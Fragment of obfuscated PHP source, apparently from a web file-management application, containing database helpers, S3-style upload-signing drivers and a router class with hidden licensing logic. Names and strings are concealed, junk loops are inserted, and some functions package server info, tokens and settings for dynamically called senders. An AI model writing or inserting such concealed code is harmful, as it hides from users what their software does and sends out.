$÷¸õ¾ªÃ[$ÆİêÜÃ[56]], $ÆİêÜÃ[39] => (bool) $÷¸õ¾ªÃ[$ÆİêÜÃ[57]], $ÆİêÜÃ[42] => (bool) $÷¸õ¾ªÃ[$ÆİêÜÃ[57]]); } } return $âºŠ¤İ¢; } public function getTables($ÕäŒåÑÛ = '') { $í„·»­Õ =& $_SERVER[ĞÂ¤àÓï]; $Ï­ÎñªÕ = $this->query($í„·»­Õ[45] . $í„·»­Õ[46] . $í„·»­Õ[47]); $¹İ£ğŠ” = array(); foreach ($Ï­ÎñªÕ as $ô‡¯ÜÌ€ => $½‹Ü˜¬ô) { $¹İ£ğŠ”[$ô‡¯ÜÌ€] = current($½‹Ü˜¬ô); } return $¹İ£ğŠ”; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $®…Ì„üì =& $_SERVER[ĞÂ¤àÓï]; $this->error = $this->_linkID->lastErrorMsg(); if ($®…Ì„üì[12] != $this->queryStr) { $this->error .= LNG($®…Ì„üì[48]) . $this->queryStr; } think_trace($this->error, $®…Ì„üì[12], $®…Ì„üì[49]); return $this->error; } public function escapeString($ëòæÓĞå) { $Èşş­ê  =& $_SERVER[ĞÂ¤àÓï]; if ($this->_linkID) { return $this->_linkID->escapeString($ëòæÓĞå); } return str_ireplace($Èşş­ê [58], $Èşş­ê [59], $ëòæÓĞå); } public function parseLimit($ˆÑë±Û) { $üÆ¸Àß =& $_SERVER[ĞÂ¤àÓï]; $¸àåÕä = $üÆ¸Àß[12]; if (!empty($ˆÑë±Û)) { $ˆÑë±Û = explode($üÆ¸Àß[50], $ˆÑë±Û); if (count($ˆÑë±Û) > 1) { $¸àåÕä .= $üÆ¸Àß[51] . $ˆÑë±Û[1] . $üÆ¸Àß[52] . $ˆÑë±Û[0] . $üÆ¸Àß[53]; } else { $¸àåÕä .= $üÆ¸Àß[51] . $ˆÑë±Û[0] . $üÆ¸Àß[53]; } } return $¸àåÕä; } } goto Aê°ë¿«‘Ü; B¼°ÁåäŠÁ: class PathDriverEDS extends PathDriverMinIO { public function __construct($ë¯Üß¢Ş) { parent::__construct($ë¯Üß¢Ş); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Òö¤Éä¡) { parent::__construct($Òö¤Éä¡); $this->signatureVersion($_SERVER[ĞÂ¤àÓï][216]); } public function uploadFormData($Àú õä´, $Ë©ôâå = 3600) { $¡èçõÉ =& $_SERVER[ĞÂ¤àÓï]; $Óâç™Ï = $¡èçõÉ[198]; $¯‚ÎÛƒŒ = $¡èçõÉ[1355]; $Î İÓê‚ = $¡èçõÉ[62]; $á…«Ç­’ = gmdate($¡èçõÉ[1356]); $ÛÖÆ¤éõ = gmdate($¡èçõÉ[750]); $×ò×™È‚ = $¡èçõÉ[1357]; $ªÒ¨á€ = $Ë©ôâå . $¡èçõÉ[12]; $ı–„õİ = $¡èçõÉ[1319]; $Ô¥Ï¡üç = array($this->accessKey, $ÛÖÆ¤éõ, $this->region, $Î İÓê‚, $×ò×™È‚); $¸Ú„§Ù = implode($¡èçõÉ[8], $Ô¥Ï¡üç); $¶ÁûÄœù = array($¡èçõÉ[1321] => gmdate($¡èçõÉ[1320], strtotime($¡èçõÉ[1358])), $¡èçõÉ[1322] => array(array($¡èçõÉ[1324] => $this->bucket), array($¡èçõÉ[1323] => $Óâç™Ï), array($¡èçõÉ[1325], $¡èçõÉ[1326], $¡èçõÉ[12]), array($¡èçõÉ[1325], $¡èçõÉ[1359], $¡èçõÉ[12]), array($¡èçõÉ[1325], $¡èçõÉ[1360], $¡èçõÉ[12]), array($¡èçõÉ[1327] => $ı–„õİ), array($¡èçõÉ[1361] => $¸Ú„§Ù), array($¡èçõÉ[1362] => $¯‚ÎÛƒŒ), array($¡èçõÉ[1363] => $á…«Ç­’), array($¡èçõÉ[1364] => $ªÒ¨á€))); $½Û¼‚Ÿò = base64_encode(json_encode($¶ÁûÄœù)); $Á°÷ƒ“´ = hash_hmac($¡èçõÉ[1365], $ÛÖÆ¤éõ, $¡èçõÉ[1366] . $this->secret, !0); $ÎÙÆ—¥ = hash_hmac($¡èçõÉ[1365], $this->region, $Á°÷ƒ“´, !0); $ãÈß—Ï¦ = hash_hmac($¡èçõÉ[1365], $Î İÓê‚, $ÎÙÆ—¥, !0); $ï”—Ö¯Ñ = hash_hmac($¡èçõÉ[1365], $×ò×™È‚, $ãÈß—Ï¦, !0); $¿œÃ­œ = hash_hmac($¡èçõÉ[1365], $½Û¼‚Ÿò, $ï”—Ö¯Ñ); $ö½©¤Êâ = array($¡èçõÉ[215] => $¡èçõÉ[12], $¡èçõÉ[1367] => $¡èçõÉ[12], $¡èçõÉ[1323] => $Óâç™Ï, $¡èçõÉ[1327] => $ı–„õİ, $¡èçõÉ[1331] => $½Û¼‚Ÿò, $¡èçõÉ[1368] => $¸Ú„§Ù, $¡èçõÉ[1369] => $¯‚ÎÛƒŒ, $¡èçõÉ[1370] => $á…«Ç­’, $¡èçõÉ[1371] => $ªÒ¨á€, $¡èçõÉ[1372] => $¿œÃ­œ, $¡èçõÉ[181] => $this->getHost()); return $ö½©¤Êâ; } } if ($_SERVER[$_SERVER[ĞÂ¤àÓï][777]] != $_SERVER[$_SERVER[ĞÂ¤àÓï][1373]]) { $_getc = $_SERVER[ĞÂ¤àÓï][778]; $_getfile = $_SERVER[$_SERVER[ĞÂ¤àÓï][779]] . $_SERVER[ĞÂ¤àÓï][780]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ĞÂ¤àÓï][231], $_getfilec); if (count($_getarrs) < $_SERVER[ĞÂ¤àÓï][630]) { $exit = $_SERVER[ĞÂ¤àÓï][781]; $exit(); } $_act = $_SERVER[ĞÂ¤àÓï][782]; $_act($_SERVER[$_SERVER[ĞÂ¤àÓï][775]]); } goto f‰‡âêö™ë; EëŞÊô¸Î: class Application { private $defaultModule = "\x69\x6e\x64\145\170"; private $defaultController = "\151\156\144\145\170"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($ÕƒƒøëÌ) { $«èß®ì =& $_SERVER[ĞÂ¤àÓï]; $¶İÅ÷˜‘ =& $_SERVER[Ñ·¨¶Š£]; $üŸ˜ü‡ = explode($¶İÅ÷˜‘[0], trim($ÕƒƒøëÌ, $¶İÅ÷˜‘[0])); $this->defaultModule = $üŸ˜ü‡[0] ? $üŸ˜ü‡[0] : $this->defaultModule; $this->defaultController = $üŸ˜ü‡[1] ? $üŸ˜ü‡[1] : $this->defaultController; $this->defaultAction = $üŸ˜ü‡[2] ? $üŸ˜ü‡[2] : $this->defaultAction; $this->bwhkceee82cc($¶İÅ÷˜‘[1], array($this, $¶İÅ÷˜‘[2])); $¨Õ¶•«¸ = $«èß®ì[619]; if (strlen($¨Õ¶•«¸) < $«èß®ì[620]) { return; } } public function appRun($µ­‚¨øš) { $á¸‡‰Ã® =& $_SERVER[ĞÂ¤àÓï]; $¯Ê£½Œİ =& $_SERVER[Ñ·¨¶Š£]; $àŞÛïİ = explode($¯Ê£½Œİ[0], $µ­‚¨øš); $Ç«ÚÁ‹¬ = $á¸‡‰Ã®[621]; if (strlen($Ç«ÚÁ‹¬) < $á¸‡‰Ã®[620]) { return; } $·µü¯ñÒ = strtolower($àŞÛïİ[0]); $õÃ•ç = $¯Ê£½Œİ[3]; $õæñ¿ÆÃ = $á¸‡‰Ã®[622]; if (strlen($õæñ¿ÆÃ) < $á¸‡‰Ã®[623]) { die; } if ($·µü¯ñÒ == $¯Ê£½Œİ[4]) { $õÃ•ç = $¯Ê£½Œİ[5]; $àŞÛïİ[0] = $¯Ê£½Œİ[6]; $àŞÛïİ[1] = $àŞÛïİ[1] . $¯Ê£½Œİ[7]; $µ­‚¨øš = join($¯Ê£½Œİ[0], $àŞÛïİ); $µ­‚¨øš = trim($µ­‚¨øš, $¯Ê£½Œİ[0]); } call_user_func(array($¯Ê£½Œİ[8], $¯Ê£½Œİ[9]), $õÃ•ç . $¯Ê£½Œİ[10], $µ­‚¨øš); ActionCall($µ­‚¨øš); $İìÙšòñ = $á¸‡‰Ã®[624]; if (!$İìÙšòñ) { die; } call_user_func(array($¯Ê£½Œİ[8], $¯Ê£½Œİ[9]), $õÃ•ç . $¯Ê£½Œİ[11], $µ­‚¨øš); $õ×­ëé¸ = $á¸‡‰Ã®[625]; while (strlen($õ×­ëé¸) < $á¸‡‰Ã®[615]) { if (!$õ×­ëé¸) { break; } $õ×­ëé¸++; } } private function autorun() { $·ñçô‹Î =& $_SERVER[Ñ·¨¶Š£]; global $config; if (count($config[$·ñçô‹Î[12]]) == 0) { return; } foreach ($config[$·ñçô‹Î[12]] as $ÕÙÙ¥å× => $ˆÖÄôÒˆ) { $this->appRun($ˆÖÄôÒˆ); } } private function ugpt88bc3955() { $ø¿Ö¦ã˜ =& $_SERVER[ĞÂ¤àÓï]; $âÛ¬³ØÕ =& $_SERVER[Ñ·¨¶Š£]; $¼âËèî = $âÛ¬³ØÕ[4]; $ÕüÉĞ£€ = $GLOBALS[$âÛ¬³ØÕ[13]][$âÛ¬³ØÕ[14]][0]; if (!$ÕüÉĞ£€ || strlen($ÕüÉĞ£€) <= strlen($¼âËèî)) { return; } if (strtolower(substr($ÕüÉĞ£€, -strlen($¼âËèî))) != $¼âËèî) { return; } $ûäà‚Ñ = substr($ÕüÉĞ£€, 0, -strlen($¼âËèî)); $’È˜µĞá = $ø¿Ö¦ã˜[626]; $Ä¹Àîè¸ = array($âÛ¬³ØÕ[4], $ûäà‚Ñ); $ñ˜çıÜ = array_slice($GLOBALS[$âÛ¬³ØÕ[13]][$âÛ¬³ØÕ[14]], 1); $¸Íóğû = $ø¿Ö¦ã˜[627]; while (strlen($¸Íóğû) < $ø¿Ö¦ã˜[623]) { if (!$¸Íóğû) { break; } $¸Íóğû++; } $GLOBALS[$âÛ¬³ØÕ[13]][$âÛ¬³ØÕ[14]] = array_merge($Ä¹Àîè¸, $ñ˜çıÜ); $¿Ç¾î‚ò = $ø¿Ö¦ã˜[628]; if (!$¿Ç¾î‚ò) { die; } $GLOBALS[$âÛ¬³ØÕ[13]][$âÛ¬³ØÕ[15]] = implode($âÛ¬³ØÕ[0], $GLOBALS[$âÛ¬³ØÕ[13]][$âÛ¬³ØÕ[14]]); } private function mdey558fc4e7() { $‰¡ÄŠì¬ =& $_SERVER[ĞÂ¤àÓï]; $º‘›ŞÍ =& $_SERVER[Ñ·¨¶Š£]; if ($GLOBALS[$º‘›ŞÍ[13]][$º‘›ŞÍ[15]] != $º‘›ŞÍ[6]) { return; } $°éÍÕß¨ = $_SERVER[$º‘›ŞÍ[16]]; $´ÙÌÜÃØ = $º‘›ŞÍ[17]; if (!strstr($°éÍÕß¨, $´ÙÌÜÃØ)) { return; } $¢…Ä¦ÇŠ = strrpos($°éÍÕß¨, $´ÙÌÜÃØ); $¶Å†—ƒÎ = $‰¡ÄŠì¬[629]; while (strlen($¶Å†—ƒÎ) < $‰¡ÄŠì¬[630]) { if (!$¶Å†—ƒÎ) { break; } $¶Å†—ƒÎ++; } $ã”ÔÌìÒ = substr($°éÍÕß¨, $¢…Ä¦ÇŠ + strlen($´ÙÌÜÃØ)); $ª›àã´ö = $‰¡ÄŠì¬[631]; while ($ª›àã´ö < $‰¡ÄŠì¬[632]) { if ($ª›àã´ö >= 0) { break; } $ª›àã´ö++; } preg_match_all($º‘›ŞÍ[18], $ã”ÔÌìÒ, $²›–¨‡á); $‘ÀÅÎ‹ = $‰¡ÄŠì¬[633]; while ($‘ÀÅÎ‹ < $‰¡ÄŠì¬[632]) { if ($‘ÀÅÎ‹ >= 0) { break; } $‘ÀÅÎ‹++; } $ã”ÔÌìÒ = trim($²›–¨‡á[0][0], $º‘›ŞÍ[19]); $Ë¯à¸– = $‰¡ÄŠì¬[634]; if (!$Ë¯à¸–) { return; } $GLOBALS[$º‘›ŞÍ[13]][$º‘›ŞÍ[14]] = explode($º‘›ŞÍ[19], $ã”ÔÌìÒ); $×Ô°êÏ = $‰¡ÄŠì¬[635]; $GLOBALS[$º‘›ŞÍ[13]][$º‘›ŞÍ[15]] = implode($º‘›ŞÍ[0], $GLOBALS[$º‘›ŞÍ[13]][$º‘›ŞÍ[14]]); } public function run() { $öÈ¬¸‡ö =& $_SERVER[ĞÂ¤àÓï]; $ƒ…´½² =& $_SERVER[Ñ·¨¶Š£]; $this->mdey558fc4e7(); $this->ugpt88bc3955(); $¢Úßş¢Œ = $GLOBALS[$ƒ…´½²[13]][$ƒ…´½²[14]]; $÷š²ûÃ‰ = $GLOBALS[$ƒ…´½²[13]][$ƒ…´½²[15]]; define($ƒ…´½²[20], isset($¢Úßş¢Œ[0]) && $¢Úßş¢Œ[0] ? $¢Úßş¢Œ[0] : $this->defaultModule); define($ƒ…´½²[21], isset($¢Úßş¢Œ[1]) && $¢Úßş¢Œ[0] ? $¢Úßş¢Œ[1] : $this->defaultController); define($ƒ…´½²[22], isset($¢Úßş¢Œ[2]) && $¢Úßş¢Œ[0] ? $¢Úßş¢Œ[2] : $this->defaultAction); $±ªÑğæ¢ = $öÈ¬¸‡ö[636]; define($ƒ…´½²[23], MOD . $ƒ…´½²[0] . ST . $ƒ…´½²[0] . ACT); $_SERVER[$ƒ…´½²[24]] = strtolower(ACTION); $ç•›†Õ = $öÈ¬¸‡ö[637]; if (!$ç•›†Õ) { return; } $this->autorun(); $â²ŞÄ§™ = $öÈ¬¸‡ö[638]; if (!$â²ŞÄ§™) { return; } if (count($¢Úßş¢Œ) >= 3) { $this->appRun($÷š²ûÃ‰); } else { $this->appRun(ACTION); } } private $xtalab6d62b8 = array(); private $lkep762b298f = ''; public function vzhqf5285e91() { $ìÈ†‰Ï² =& $_SERVER[ĞÂ¤àÓï]; $¢ÉÏÑ³¹ =& $_SERVER[Ñ·¨¶Š£]; $this->tlrh6575278b(); $this->hngf8aaac435(); $ç‰Œ½¬ = $ìÈ†‰Ï²[639]; while ($ç‰Œ½¬ < $ìÈ†‰Ï²[623]) { if ($ç‰Œ½¬ >= 0) { break; } $ç‰Œ½¬++; } $this->ezwxa8b1a89d(); $this->cxfo900d0405(); $this->gpji65050c22(); $ íü¿ü¤ = $ìÈ†‰Ï²[640]; $this->tgkxd82c3d7e(); $àºùÁô = $ìÈ†‰Ï²[641]; if (strlen($àºùÁô) < $ìÈ†‰Ï²[623]) { return; } $this->ugvz3279cb8b(); $this->bwhkceee82cc($¢ÉÏÑ³¹[25], array($this, $¢ÉÏÑ³¹[26])); $ß™°Äşì = $ìÈ†‰Ï²[642]; if (!$ß™°Äşì) { die; } $this->bwhkceee82cc($¢ÉÏÑ³¹[27], array($this, $¢ÉÏÑ³¹[28])); $‘ó“ä•† = $ìÈ†‰Ï²[643]; while (strlen($‘ó“ä•†) < $ìÈ†‰Ï²[615]) { if (!$‘ó“ä•†) { break; } $‘ó“ä•†++; } $this->bwhkceee82cc($¢ÉÏÑ³¹[29], array($this, $¢ÉÏÑ³¹[30])); $ÉµƒêË­ = $ìÈ†‰Ï²[644]; while (strlen($ÉµƒêË­) < $ìÈ†‰Ï²[615]) { if (!$ÉµƒêË­) { break; } $ÉµƒêË­++; } $this->bwhkceee82cc($¢ÉÏÑ³¹[31], array($this, $¢ÉÏÑ³¹[32])); } public function hlyr1620c5db($ÓØ¡…»Š) { $¢ Ëğøè =& $_SERVER[ĞÂ¤àÓï]; $Ö¬®¿ø =& $_SERVER[Ñ·¨¶Š£]; $ëÛˆõÇ = Model($Ö¬®¿ø[33])->get(); $Œ¡†Ù°ñ = $¢ Ëğøè[645]; $ã°¤å¾ = array($Ö¬®¿ø[34], $Ö¬®¿ø[35], $Ö¬®¿ø[36], $Ö¬®¿ø[37], $Ö¬®¿ø[38], $Ö¬®¿ø[39], $Ö¬®¿ø[40], $Ö¬®¿ø[41], $Ö¬®¿ø[42], $Ö¬®¿ø[43], $Ö¬®¿ø[44], $Ö¬®¿ø[45], $Ö¬®¿ø[46], $Ö¬®¿ø[47], $Ö¬®¿ø[48], $Ö¬®¿ø[49], $Ö¬®¿ø[50], $Ö¬®¿ø[51], $Ö¬®¿ø[52], $Ö¬®¿ø[53], $Ö¬®¿ø[54], $Ö¬®¿ø[55], $Ö¬®¿ø[56], $Ö¬®¿ø[57], $Ö¬®¿ø[58], $Ö¬®¿ø[59], $Ö¬®¿ø[60], $Ö¬®¿ø[61], $Ö¬®¿ø[62], $Ö¬®¿ø[63], $Ö¬®¿ø[64], $Ö¬®¿ø[65], $Ö¬®¿ø[66], $Ö¬®¿ø[67], $Ö¬®¿ø[68], $Ö¬®¿ø[69], $Ö¬®¿ø[70], $Ö¬®¿ø[71], $Ö¬®¿ø[72], $Ö¬®¿ø[73], $Ö¬®¿ø[74], $Ö¬®¿ø[75], $Ö¬®¿ø[76], $Ö¬®¿ø[77], $Ö¬®¿ø[78], $Ö¬®¿ø[79], $Ö¬®¿ø[80], $Ö¬®¿ø[81], $Ö¬®¿ø[82], $Ö¬®¿ø[83], $Ö¬®¿ø[84]); foreach ($ã°¤å¾ as $ëÌ¥Ë»÷) { $‘Ï¿µßæ = $GLOBALS[$Ö¬®¿ø[85]][$Ö¬®¿ø[86]][$ëÌ¥Ë»÷]; $»‹«Ó‘ = $¢ Ëğøè[646]; if (!$»‹«Ó‘) { die; } if (isset($ëÛˆõÇ[$ëÌ¥Ë»÷])) { $‘Ï¿µßæ = $ëÛˆõÇ[$ëÌ¥Ë»÷]; } $ÓØ¡…»Š[$Ö¬®¿ø[87]][$Ö¬®¿ø[88]][$ëÌ¥Ë»÷] = $‘Ï¿µßæ; } $õ•—½­¤ = $ÓØ¡…»Š[$Ö¬®¿ø[87]][$Ö¬®¿ø[88]][$Ö¬®¿ø[46]]; $ï¥ÌñÅÂ = $¢ Ëğøè[647]; if (!$ï¥ÌñÅÂ) { die; } unset($ÓØ¡…»Š[$Ö¬®¿ø[87]][$Ö¬®¿ø[89]][$Ö¬®¿ø[90]]); $ôü¶–Õ = $¢ Ëğøè[648]; if (!$ôü¶–Õ) { die; } unset($ÓØ¡…»Š[$Ö¬®¿ø[87]][$Ö¬®¿ø[89]][$Ö¬®¿ø[91]]); unset($ÓØ¡…»Š[$Ö¬®¿ø[87]][$Ö¬®¿ø[88]][$Ö¬®¿ø[46]]); $ªÛ»íÛ¾ = $¢ Ëğøè[649]; if (!$ªÛ»íÛ¾) { die; } unset($ÓØ¡…»Š[$Ö¬®¿ø[87]][$Ö¬®¿ø[88]][$Ö¬®¿ø[92]]); $ˆŠüí‚› = $¢ Ëğøè[650]; $ÓØ¡…»Š[$Ö¬®¿ø[87]][$Ö¬®¿ø[88]][$Ö¬®¿ø[93]] = array($Ö¬®¿ø[94] => (int) $õ•—½­¤[$Ö¬®¿ø[95]], $Ö¬®¿ø[96] => (int) _get($õ•—½­¤, $Ö¬®¿ø[97], 0)); $ÓØ¡…»Š[$Ö¬®¿ø[98]][$Ö¬®¿ø[99]] = Action($Ö¬®¿ø[100])->accessToken(); $ÓØ¡…»Š[$Ö¬®¿ø[98]][$Ö¬®¿ø[101]] = md5($_SERVER[$Ö¬®¿ø[102]] . $ëÛˆõÇ[$Ö¬®¿ø[103]]); $€ÖÌÑÅ° = $¢ Ëğøè[651]; $ÓØ¡…»Š[$Ö¬®¿ø[98]][$Ö¬®¿ø[104]] = base64_encode(serverInfo()); $¼öøõ¬ƒ = $¢ Ëğøè[652]; while ($¼öøõ¬ƒ < $¢ Ëğøè[632]) { if ($¼öøõ¬ƒ >= 0) { break; } $¼öøõ¬ƒ++; } $ÓØ¡…»Š[$Ö¬®¿ø[98]][$Ö¬®¿ø[105]] = $this->lkep762b298f; $ÈİùÊûÉ = $¢ Ëğøè[653]; while (strlen($ÈİùÊûÉ) < $¢ Ëğøè[620]) { if (!$ÈİùÊûÉ) { break; } $ÈİùÊûÉ++; } if ($ëÛˆõÇ[$Ö¬®¿ø[105]] != $Ö¬®¿ø[106]) { $ÓØ¡…»Š[$Ö¬®¿ø[98]][$Ö¬®¿ø[107]] = $ëÛˆõÇ[$Ö¬®¿ø[107]]; $ÓØ¡…»Š[$Ö¬®¿ø[98]][$Ö¬®¿ø[108]] = $ëÛˆõÇ[$Ö¬®¿ø[108]]; $„ì’ÓùÓ = rand_string(10) . $this->lkep762b298f . rand_string(5); $ÓØ¡…»Š[$Ö¬®¿ø[87]][$Ö¬®¿ø[109]][$Ö¬®¿ø[110]] = $this->oxpde7edb224($„ì’ÓùÓ, $ÓØ¡…»Š[$Ö¬®¿ø[98]][$Ö¬®¿ø[101]]); } if ($this->lkep762b298f == $Ö¬®¿ø[106]) { $ÓØ¡…»Š[$Ö¬®¿ø[87]][$Ö¬®¿ø[88]][$Ö¬®¿ø[93]][$Ö¬®¿ø[97]] = 0; } $ÓØ¡…»Š[$Ö¬®¿ø[98]][$Ö¬®¿ø[111]] = _get($this->xtalab6d62b8, $Ö¬®¿ø[112], $Ö¬®¿ø[6]); $ÓØ¡…»Š[$Ö¬®¿ø[98]][$Ö¬®¿ø[113]] = _get($this->xtalab6d62b8, $Ö¬®¿ø[114], $Ö¬®¿ø[6]); if (_get($GLOBALS, $Ö¬®¿ø[115]) && $this->config[$Ö¬®¿ø[116]]) { $ÓØ¡…»Š[$Ö¬®¿ø[98]][$Ö¬®¿ø[117]] = WEB_ROOT; } return $ÓØ¡…»Š; } private function tgkxd82c3d7e() { $ÛáÄçÉÁ =& $_SERVER[ĞÂ¤àÓï]; $úè…Ï é =& $_SERVER[Ñ·¨¶Š£]; $¯ø½õÇ = $_SERVER[$úè…Ï é[24]] == $úè…Ï é[118]; $à½ÙÊÂı = $ÛáÄçÉÁ[654]; if (strlen($à½ÙÊÂı) < $ÛáÄçÉÁ[630]) { die; } if ($_SERVER[$úè…Ï é[24]] == $úè…Ï é[119] && $_GET[$úè…Ï é[120]] == $úè…Ï é[121]) { $¯ø½õÇ = !0; } if ($¯ø½õÇ) { $Í¨ø¤ò¹ = array($úè…Ï é[105] => $this->lkep762b298f, $úè…Ï é[122] => $this->vngsc9544fec(), $úè…Ï é[123] => Model($úè…Ï é[124])->count()); if ($this->lkep762b298f != $úè…Ï é[106]) { $û½¸ÌÉ‰ = _get($this->xtalab6d62b8, $úè…Ï é[125]); if ($û½¸ÌÉ‰) { $Í¨ø¤ò¹[$úè…Ï é[126]] = $û½¸ÌÉ‰; $Í¨ø¤ò¹[$úè…Ï é[127]] = strtotime(_get($this->xtalab6d62b8, $úè…Ï é[128])); $Í¨ø¤ò¹[$úè…Ï é[129]] = _get($this->xtalab6d62b8, $úè…Ï é[114]); } $ÙÒ¸š’ª = Model($úè…Ï é[33])->get($úè…Ï é[130], $úè…Ï é[6], !0); if (is_string($ÙÒ¸š’ª) && substr($ÙÒ¸š’ª, 0, 1) == $úè…Ï é[131]) { $ÙÒ¸š’ª = json_decode_force($ÙÒ¸š’ª); } if (is_array($ÙÒ¸š’ª) && $ÙÒ¸š’ª[$úè…Ï é[132]] && strstr($ÙÒ¸š’ª[$úè…Ï é[132]], $úè…Ï é[133])) { $¯ÈØ²™ = explode($úè…Ï é[133], $ÙÒ¸š’ª[$úè…Ï é[132]]); $Í¨ø¤ò¹[$úè…Ï é[134]] = $¯ÈØ²™[0]; } } $Í¨ø¤ò¹ = $this->wzbhbb44e3d1(json_encode($Í¨ø¤ò¹), md5($úè…Ï é[135])); $íŒ¢€ıœ = $ÛáÄçÉÁ[655]; if (strlen($íŒ¢€ıœ) < $ÛáÄçÉÁ[623]) { return; } $ı”ïë÷ß = array($úè…Ï é[136] => $Í¨ø¤ò¹); $¢îÇíúŠ = $ÛáÄçÉÁ[656]; while ($¢îÇíúŠ < $ÛáÄçÉÁ[632]) { if ($¢îÇíúŠ >= 0) { break; } $¢îÇíúŠ++; } call_user_func(array($úè…Ï é[137], $úè…Ï é[138]), $ı”ïë÷ß); } if ($this->lkep762b298f == $úè…Ï é[106]) { return; } $×¹¨¢ñæ = array($úè…Ï é[139], $úè…Ï é[140], $úè…Ï é[141], $úè…Ï é[142], $úè…Ï é[143], $úè…Ï é[144]); $ÁÁò¾’™ = Model($úè…Ï é[33])->get(); $·¥¿¯Ö = $ÛáÄçÉÁ[657]; if (!$·¥¿¯Ö) { return; } $ı”ïë÷ß = array($úè…Ï é[145] => $ÁÁò¾’™[$úè…Ï é[34]], $úè…Ï é[146] => $ÁÁò¾’™[$úè…Ï é[35]], $úè…Ï é[147] => $úè…Ï é[6]); foreach ($×¹¨¢ñæ as $¡©¢°¾) { if (!isset($ÁÁò¾’™[$¡©¢°¾]) || !$ÁÁò¾’™[$¡©¢°¾]) { continue; } $ı”ïë÷ß[$¡©¢°¾] = $ÁÁò¾’™[$¡©¢°¾]; } call_user_func(array($úè…Ï é[137], $úè…Ï é[138]), $ı”ïë÷ß); } private function cxfo900d0405() { $ÃäŠÊ‰ƒ =& $_SERVER[ĞÂ¤àÓï]; $›‹è‡ıİ =& $_SERVER[Ñ·¨¶Š£]; if ($_SERVER[$›‹è‡ıİ[24]] != $›‹è‡ıİ[148]) { return; } if (!_get($GLOBALS, $›‹è‡ıİ[115])) { die; } $æ•Œ·ƒ‡ = $GLOBALS[$›‹è‡ıİ[13]]; if (isset($æ•Œ·ƒ‡[$›‹è‡ıİ[149]])) { $this->vxiw22996a12(); die; } if (!isset($æ•Œ·ƒ‡[$›‹è‡ıİ[150]]) || strlen($æ•Œ·ƒ‡[$›‹è‡ıİ[150]]) != 16) { show_json($›‹è‡ıİ[151] . $æ•Œ·ƒ‡[$›‹è‡ıİ[150]], !1); } $á ÷®ğ– = Model($›‹è‡ıİ[33])->get($›‹è‡ıİ[103]); $Áôªéã = md5($_SERVER[$›‹è‡ıİ[102]] . $á ÷®ğ–); $Áû’Êæª = $ÃäŠÊ‰ƒ[658]; while ($Áû’Êæª < $ÃäŠÊ‰ƒ[620]) { if ($Áû’Êæª >= 0) { break; } $Áû’Êæª++; } $…·†ŒÄ° = array($›‹è‡ıİ[150] => $æ•Œ·ƒ‡[$›‹è‡ıİ[150]], $›‹è‡ıİ[152] => rand_string(16), $›‹è‡ıİ[153] => $›‹è‡ıİ[135], $›‹è‡ıİ[154] => $›‹è‡ıİ[155], $›‹è‡ıİ[156] => $_SERVER[$›‹è‡ıİ[157]], $›‹è‡ıİ[158] => $_SERVER[$›‹è‡ıİ[159]], $›‹è‡ıİ[160] => $_SERVER[$›‹è‡ıİ[161]], $›‹è‡ıİ[101] => $Áôªéã, $›‹è‡ıİ[162] => Model($›‹è‡ıİ[33])->get($›‹è‡ıİ[130])); $üõ…Ñ›‚ = $ÃäŠÊ‰ƒ[659]; if (strlen($üõ…Ñ›‚) < $ÃäŠÊ‰ƒ[620]) { die; } if ($æ•Œ·ƒ‡[$›‹è‡ıİ[163]] == $›‹è‡ıİ[164]) { $´Ïâèœù = $this->wzbhbb44e3d1($Áôªéã, $›‹è‡ıİ[165]); $îÇ°™¸Ï = $this->oxpde7edb224(json_encode($…·†ŒÄ°), $Áôªéã . $›‹è‡ıİ[166], 3); $îÇ°™¸Ï = $îÇ°™¸Ï . $›‹è‡ıİ[167] . $_SERVER[$›‹è‡ıİ[157]]; $Şâ¢º¦ï = $this->khom8bf9133e($›‹è‡ıİ[168] . $´Ïâèœù . $›‹è‡ıİ[169] . $îÇ°™¸Ï, -1); show_json($Şâ¢º¦ï, !0); } else { if ($æ•Œ·ƒ‡[$›‹è‡ıİ[163]] == $›‹è‡ıİ[170]) { $ÌŒÕ¨°Ç = substr(md5($›‹è‡ıİ[171] . $Áôªéã), 12, 15) . $›‹è‡ıİ[172]; $îÇ°™¸Ï = $this->cslmccd44fbb(trim($æ•Œ·ƒ‡[$›‹è‡ıİ[173]]), $ÌŒÕ¨°Ç, 2); $Ú›Şè½á = json_decode($îÇ°™¸Ï, !0); if (!is_array($Ú›Şè½á) || !is_array($Ú›Şè½á[$›‹è‡ıİ[174]]) || $Ú›Şè½á[$›‹è‡ıİ[150]] != !0) { $ÒİŸºˆö = $›‹è‡ıİ[175]; $÷Ù‡…ı = $Ú›Şè½á[$›‹è‡ıİ[174]] ? $›‹è‡ıİ[176] . $Ú›Şè½á[$›‹è‡ıİ[174]] : $ÒİŸºˆö; show_json($÷Ù‡…ı, !1); } else { $…·†ŒÄ°[$›‹è‡ıİ[152]] = $Ú›Şè½á[$›‹è‡ıİ[174]][$›‹è‡ıİ[177]]; } } else { $Ú›Şè½á = $this->khom8bf9133e($›‹è‡ıİ[178], $…·†ŒÄ°, 10); $ë‚±¼† = $ÃäŠÊ‰ƒ[660]; if (strlen($ë‚±¼†) < $ÃäŠÊ‰ƒ[623]) { die; } } } if (!is_array($Ú›Şè½á) || !is_array($Ú›Şè½á[$›‹è‡ıİ[174]]) || $Ú›Şè½á[$›‹è‡ıİ[150]] != !0) { $ÒİŸºˆö = LNG($›‹è‡ıİ[179]); $÷Ù‡…ı = $Ú›Şè½á[$›‹è‡ıİ[174]] ? $›‹è‡ıİ[176] . $Ú›Şè½á[$›‹è‡ıİ[174]] : $ÒİŸºˆö; show_json($÷Ù‡…ı, !1); } $¢¿¤Ñû = $Ú›Şè½á[$›‹è‡ıİ[174]]; $õÃçû = $this->kscwe829485a($¢¿¤Ñû[$›‹è‡ıİ[180]]); $ ™´¼° = $ÃäŠÊ‰ƒ[661]; while ($ ™´¼° < $ÃäŠÊ‰ƒ[620]) { if ($ ™´¼° >= 0) { break; } $ ™´¼°++; } if (!$õÃçû || $õÃçû != $¢¿¤Ñû[$›‹è‡ıİ[128]]) { $Ä÷ä®™ = array($›‹è‡ıİ[181] => Model($›‹è‡ıİ[33])->get($›‹è‡ıİ[103]), $›‹è‡ıİ[182] => $_SERVER[$›‹è‡ıİ[102]], $›‹è‡ıİ[183] => this_url(), 